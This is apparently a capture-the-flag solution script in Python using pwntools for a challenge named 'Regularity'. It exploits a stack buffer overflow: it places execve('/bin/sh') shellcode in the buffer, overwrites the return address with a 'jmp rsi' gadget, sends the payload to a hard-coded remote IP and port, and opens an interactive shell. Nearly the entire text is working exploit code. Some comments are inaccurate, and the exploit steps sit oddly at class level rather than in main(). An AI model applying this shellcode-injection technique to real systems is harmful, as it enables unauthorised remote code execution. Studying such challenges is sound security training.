from pwn import *

class Regularity:
    def main(self):
        solution = '''
        signed __int64 read() {
            char buf[256]; // [rsp+0h] [rbp-100h] BYREF -> 0x100 = 256 bytes -> Buffer overflow of 256 bytes
            return sys_read(0, buf, 0x110uLL); -> 0x110 = 272 bytes -> Read 272 bytes from stdin into buf
        }
    '''
    # Load the binary file with checksec disabled (we already know the protections)
    context.binary = './regularity'
    context.log_level = 'warn'
    context.arch = 'amd64'

    # Generate shellcode to execute /bin/sh using pwntools' shellcraft (execve syscall)
    shellcode = asm(shellcraft.sh())

    # Create the payload:
    # - shellcode goes first (will be placed in the beginning of the input buffer)
    # - padding fills up the rest of the buffer (up to 256 bytes)
    # - finally, overwrite return address or control flow with 0x401041 (address of `jmp rsi`)
    payload = shellcode + b"A" * (256 - len(shellcode)) + p64(0x401041)

    # Connect to the remote challenge server (host:port)
    conn = remote('94.237.48.12', 47366)

    # Send the crafted payload (this gets written into a RWX buffer)
    conn.sendline(payload)

    # Open interactive mode to interact with the shell
    conn.interactive()

# Run main() if the script is executed directly
if __name__ == '__main__':
    Regularity().main()
